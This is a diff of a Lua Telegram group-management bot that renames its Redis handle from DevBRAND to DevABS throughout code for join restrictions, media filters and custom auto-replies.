 SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙موقعه في المجموعه ↫ "..status.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end end
@@ -2084,21 +2084,21 @@ end
 --     Source BRAND     --
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-DevBRAND:set(BRAND..'Save:UserName'..msg.sender_user_id_,data.username_)
+DevABS:set(BRAND..'Save:UserName'..msg.sender_user_id_,data.username_)
 end;end,nil) 
 --     Source BRAND     --
 local ReFalse = tostring(msg.chat_id_)
-if not DevBRAND:sismember(BRAND.."BRAND:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
+if not DevABS:sismember(BRAND.."BRAND:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
 print("Return False : The Bot Is Not Enabled In The Group")
 return false
 end
 --     Source BRAND     --
 -------- MSG TYPES ---------
 if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
-if DevBRAND:get(BRAND..'BRAND:Lock:Robot'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Robot'..msg.chat_id_) then
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, dp.id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, dp.id_)
 local Text = '⌁︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n⌁︙يجب علينا التأكد أنك لست روبوت\n⌁︙تم تقيدك اضغط الزر بالاسفل لفكه'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
@@ -2107,14 +2107,14 @@ HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='.
 end,nil)
 return false
 end
-if DevBRAND:get(BRAND.."BRAND:Lock:Join"..msg.chat_id_) then
+if DevABS:get(BRAND.."BRAND:Lock:Join"..msg.chat_id_) then
 ChatKick(msg.chat_id_,msg.sender_user_id_) 
 return false  
 end
 end
 if msg.content_.ID == "MessagePhoto" then
 if not Manager(msg) then 
-local filter = DevBRAND:smembers(BRAND.."BRAND:FilterPhoto"..msg.chat_id_)
+local filter = DevABS:smembers(BRAND.."BRAND:FilterPhoto"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.photo_.id_ then
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الصوره التي ارسلتها تم منعها من المجموعه")  
@@ -2126,7 +2126,7 @@ end
 end
 if msg.content_.ID == "MessageAnimation" then
 if not Manager(msg) then 
-local filter = DevBRAND:smembers(BRAND.."BRAND:FilterAnimation"..msg.chat_id_)
+local filter = DevABS:smembers(BRAND.."BRAND:FilterAnimation"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.animation_.animation_.persistent_id_ then
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙المتحركه التي ارسلتها تم منعها من المجموعه")  
@@ -2138,7 +2138,7 @@ end
 end
 if msg.content_.ID == "MessageSticker" then
 if not Manager(msg) then 
-local filter = DevBRAND:smembers(BRAND.."BRAND:FilterSteckr"..msg.chat_id_)
+local filter = DevABS:smembers(BRAND.."BRAND:FilterSteckr"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.sticker_.sticker_.persistent_id_ then
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الملصق الذي ارسلته تم منعه من المجموعه")  
@@ -2150,78 +2150,78 @@ end
 end
 --     Source BRAND     --
 if text and text:match("^(.*)$") then
-local DelGpRedRedods = DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-local GetGpTexts = DevBRAND:get(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRedRedods = DevABS:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local GetGpTexts = DevABS:get(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRedRedods == 'DelGpRedRedods' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:srem(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
 return false
 end
 end
 if text and text:match("^(.*)$") then
-local DelGpRed = DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRed = DevABS:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRed == 'DelGpRedod' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
+DevABS:srem(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
 return false
 end
 end
 if text and text:match("^(.*)$") then
-local DelGpRed = DevBRAND:get(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRed = DevABS:get(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRed == 'DelGpRed' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
-DevBRAND:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Video:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:File:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Text:GpRed'..msg.content_.text_..msg.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
+DevABS:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Video:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:File:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Text:GpRed'..msg.content_.text_..msg.chat_id_)
+DevABS:srem(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
 return false
 end
 end
 if text and text:match("^(.*)$") then
-local DelAllRed = DevBRAND:get(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
+local DelAllRed = DevABS:get(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
 if DelAllRed == 'DelAllRed' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
-DevBRAND:del(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
-DevBRAND:del(BRAND.."BRAND:Gif:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Voice:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Audio:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Photo:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Stecker:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Video:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:File:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Text:AllRed"..msg.content_.text_)
-DevBRAND:del(BRAND.."BRAND:Sudo:AllRed",msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:Gif:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Voice:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Audio:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Photo:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Stecker:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Video:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:File:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Text:AllRed"..msg.content_.text_)
+DevABS:del(BRAND.."BRAND:Sudo:AllRed",msg.content_.text_)
 return false
 end
 end
 --     Source BRAND     --
 if text and text:match("^(.*)$") then
-local SaveGpRedod = DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local SaveGpRedod = DevABS:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if SaveGpRedod == 'SaveGpRedod' then
-local GetGpTexts = DevBRAND:get(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
-local List = DevBRAND:smembers(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_)
+local GetGpTexts = DevABS:get(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_)
 if text == "الغاء" then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙⌁︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
+DevABS:srem(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
 return false
 end
 Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
-DevBRAND:sadd(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
+DevABS:sadd(BRAND..'BRAND:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
 if #List == 4 then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
 local BRAND = "⌁︙تم حفظ الرد رقم ↫ "..(#List+1).."\n⌁︙قم بارسال الرد رقم ↫ "..(#List+2)
@@ -2232,36 +2232,36 @@ https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='.
 return false
 end
 end
-if text and not DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
-if DevBRAND:sismember(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text) then
-local BRANDTTEAM =  DevBRAND:smembers(BRAND..'BRAND:Text:GpTexts'..text..msg.chat_id_)
+if text and not DevABS:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
+if DevABS:sismember(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text) then
+local BRANDTTEAM =  DevABS:smembers(BRAND..'BRAND:Text:GpTexts'..text..msg.chat_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '['..BRANDTTEAM[math.random(#BRANDTTEAM)]..']' , 1, 'md')  
 end
 end
 --     Source BRAND     --
 if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
-local SaveGpRed = DevBRAND:get(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local SaveGpRed = DevABS:get(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 if SaveGpRed == 'SaveGpRed' then 
 if text == 'الغاء' then
-local DelManagerRep = DevBRAND:get(BRAND..'DelManagerRep'..msg.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_,DelManagerRep)
+local DelManagerRep = DevABS:get(BRAND..'DelManagerRep'..msg.chat_id_)
+DevABS:srem(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_,DelManagerRep)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:del(BRAND..'DelManagerRep'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'DelManagerRep'..msg.chat_id_)
 return false
 end
-DevBRAND:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
-local SaveGpRed = DevBRAND:get(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
-if msg.content_.video_ then DevBRAND:set(BRAND..'BRAND:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local SaveGpRed = DevABS:get(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
+if msg.content_.video_ then DevABS:set(BRAND..'BRAND:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
 end
-if msg.content_.document_ then DevBRAND:set(BRAND..'BRAND:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
+if msg.content_.document_ then DevABS:set(BRAND..'BRAND:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
 end
-if msg.content_.sticker_ then DevBRAND:set(BRAND..'BRAND:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
+if msg.content_.sticker_ then DevABS:set(BRAND..'BRAND:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
 end 
-if msg.content_.voice_ then DevBRAND:set(BRAND..'BRAND:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
+if msg.content_.voice_ then DevABS:set(BRAND..'BRAND:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
 end
-if msg.content_.audio_ then DevBRAND:set(BRAND..'BRAND:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
+if msg.content_.audio_ then DevABS:set(BRAND..'BRAND:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
 end
 if msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -2276,47 +2276,47 @@ end
 if msg.content_.photo_.sizes_[3] then
 photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-DevBRAND:set(BRAND..'BRAND:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
+DevABS:set(BRAND..'BRAND:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
 end
-if msg.content_.animation_ then DevBRAND:set(BRAND..'BRAND:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
+if msg.content_.animation_ then DevABS:set(BRAND..'BRAND:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
 end 
 if msg.content_.text_ then
-DevBRAND:set(BRAND..'BRAND:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
+DevABS:set(BRAND..'BRAND:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
 end 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
-DevBRAND:del(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
-DevBRAND:del(BRAND..'DelManagerRep'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'DelManagerRep'..msg.chat_id_)
 return false 
 end 
 end
-if msg.content_.text_ and not DevBRAND:get(BRAND..'BRAND:Lock:GpRed'..msg.chat_id_) then 
-if DevBRAND:get(BRAND..'BRAND:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevBRAND:get(BRAND..'BRAND:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if msg.content_.text_ and not DevABS:get(BRAND..'BRAND:Lock:GpRed'..msg.chat_id_) then 
+if DevABS:get(BRAND..'BRAND:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevABS:get(BRAND..'BRAND:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end 
-if DevBRAND:get(BRAND..'BRAND:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevBRAND:get(BRAND..'BRAND:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevABS:get(BRAND..'BRAND:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevABS:get(BRAND..'BRAND:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end 
-if DevBRAND:get(BRAND..'BRAND:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND..'BRAND:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevABS:get(BRAND..'BRAND:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND..'BRAND:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end
-if DevBRAND:get(BRAND..'BRAND:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND..'BRAND:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevABS:get(BRAND..'BRAND:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND..'BRAND:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end
-if DevBRAND:get(BRAND..'BRAND:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND..'BRAND:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevABS:get(BRAND..'BRAND:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND..'BRAND:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end
-if DevBRAND:get(BRAND..'BRAND:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND..'BRAND:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevABS:get(BRAND..'BRAND:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND..'BRAND:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end 
-if DevBRAND:get(BRAND..'BRAND:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevBRAND:get(BRAND..'BRAND:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
+if DevABS:get(BRAND..'BRAND:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevABS:get(BRAND..'BRAND:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
 end
-if DevBRAND:get(BRAND..'BRAND:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
 function BRANDTTEAM(extra,result,success)
 if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
-local edit_msg = DevBRAND:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local Text = DevBRAND:get(BRAND..'BRAND:Text:GpRed'..msg.content_.text_..msg.chat_id_)
+local edit_msg = DevABS:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local Text = DevABS:get(BRAND..'BRAND:Text:GpRed'..msg.content_.text_..msg.chat_id_)
 local Text = Text:gsub('#username',(username or 'لا يوجد')) 
 local Text = Text:gsub('#name','['..result.first_name_..']')
 local Text = Text:gsub('#id',msg.sender_user_id_)
@@ -2331,33 +2331,33 @@ end
 --     Source BRAND     --
 text = msg.content_.text_
 if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
-local SaveAllRed = DevBRAND:get(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
+local SaveAllRed = DevABS:get(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
 if SaveAllRed == 'SaveAllRed' then
 if text == 'الغاء' then
-local DelSudoRep = DevBRAND:get(BRAND..'DelSudoRep')
-DevBRAND:del(BRAND.."BRAND:Sudo:AllRed",DelSudoRep)
+local DelSudoRep = DevABS:get(BRAND..'DelSudoRep')
+DevABS:del(BRAND.."BRAND:Sudo:AllRed",DelSudoRep)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_)
-DevBRAND:del(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
-DevBRAND:del(BRAND.."DelSudoRep")
+DevABS:del(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
+DevABS:del(BRAND.."DelSudoRep")
 return false
 end
-DevBRAND:del(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
-local SaveAllRed = DevBRAND:get(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
+local SaveAllRed = DevABS:get(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_)
 if msg.content_.video_ then
-DevBRAND:set(BRAND.."BRAND:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
+DevABS:set(BRAND.."BRAND:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
 end
 if msg.content_.document_ then
-DevBRAND:set(BRAND.."BRAND:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
+DevABS:set(BRAND.."BRAND:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
 end
 if msg.content_.sticker_ then
-DevBRAND:set(BRAND.."BRAND:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
+DevABS:set(BRAND.."BRAND:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
 end
 if msg.content_.voice_ then
-DevBRAND:set(BRAND.."BRAND:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
+DevABS:set(BRAND.."BRAND:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
 end
 if msg.content_.audio_ then
-DevBRAND:set(BRAND.."BRAND:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
+DevABS:set(BRAND.."BRAND:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
 end
 if msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -2372,46 +2372,46 @@ end
 if msg.content_.photo_.sizes_[3] then
 photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-DevBRAND:set(BRAND.."BRAND:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
+DevABS:set(BRAND.."BRAND:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
 end
 if msg.content_.animation_ then
-DevBRAND:set(BRAND.."BRAND:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
+DevABS:set(BRAND.."BRAND:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
 end
 if msg.content_.text_ then
-DevBRAND:set(BRAND.."BRAND:Text:AllRed"..SaveAllRed, msg.content_.text_)
+DevABS:set(BRAND.."BRAND:Text:AllRed"..SaveAllRed, msg.content_.text_)
 end 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
-DevBRAND:del(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_)
-DevBRAND:del(BRAND..'DelSudoRep')
+DevABS:del(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_)
+DevABS:del(BRAND..'DelSudoRep')
 return false end end
-if msg.content_.text_ and not DevBRAND:get(BRAND..'BRAND:Lock:AllRed'..msg.chat_id_) then
-if DevBRAND:get(BRAND.."BRAND:Video:AllRed"..msg.content_.text_) then
-sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevBRAND:get(BRAND.."BRAND:Video:AllRed"..msg.content_.text_))
+if msg.content_.text_ and not DevABS:get(BRAND..'BRAND:Lock:AllRed'..msg.chat_id_) then
+if DevABS:get(BRAND.."BRAND:Video:AllRed"..msg.content_.text_) then
